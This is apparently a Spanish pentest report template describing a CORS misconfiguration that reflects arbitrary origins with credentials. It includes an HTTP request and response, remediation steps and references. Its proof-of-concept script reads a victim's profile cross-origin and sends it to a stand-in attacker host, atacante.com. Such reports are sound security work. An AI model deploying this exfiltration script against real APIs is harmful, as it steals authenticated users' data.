# CORS Misconfiguration — Arbitrary Origin Trusted (CWE-942) - {{Media | Baja}}

| Campo | Valor |
|---|---|
| **CVSS Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| **CVSS Score** | `{{6.9}}` |
| **CWE** | [CWE-942 – Permissive Cross-domain Policy with Untrusted Domains](https://cwe.mitre.org/data/definitions/942.html) |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Estado** | {{Abierto}} |

## Descripción

La política CORS confía en orígenes arbitrarios: refleja el valor de la cabecera `Origin`
en `Access-Control-Allow-Origin` (o usa `*`) mientras habilita
`Access-Control-Allow-Credentials: true`. Esto permite que un sitio malicioso, desde el
navegador de una víctima autenticada, realice peticiones cross-origin con sus credenciales
y lea las respuestas, exfiltrando datos sensibles.

## Componentes Afectados

- `{{https://api.cliente.com/...}}`
- **Cabeceras:** `{{Access-Control-Allow-Origin}}`, `{{Access-Control-Allow-Credentials}}`

## Detalles

Se comprobó que la API refleja cualquier `Origin` enviado y permite credenciales.

**Paso 1 — Petición con un Origin arbitrario**

```http
GET /api/profile HTTP/1.1
Host: api.cliente.com
Origin: https://atacante.com
Cookie: session={{...}}
```

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://atacante.com   // refleja el origin del atacante
Access-Control-Allow-Credentials: true

{"email":"victima@cliente.com", ...}
```

> _Figura {{N}}: el servidor confía en el origen del atacante y permite leer la respuesta con credenciales._

**Paso 2 — Exploit (PoC desde el sitio del atacante)**

```html
<script>
fetch('https://api.cliente.com/api/profile', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://atacante.com/leak?d=' + encodeURIComponent(d)));
</script>
```

## Impacto

Un atacante puede leer datos sensibles de la sesión de la víctima desde un sitio de
terceros, derivando en fuga de información y, según los endpoints, en acciones no
autorizadas.

## Remediación

- Validar `Origin` contra una **lista blanca** explícita; nunca reflejar el origen recibido.
- No combinar `Access-Control-Allow-Origin: *` con `Allow-Credentials: true`.
- Restringir métodos y cabeceras permitidas al mínimo necesario.

## Referencias

- https://cwe.mitre.org/data/definitions/942.html
- https://portswigger.net/web-security/cors
- https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
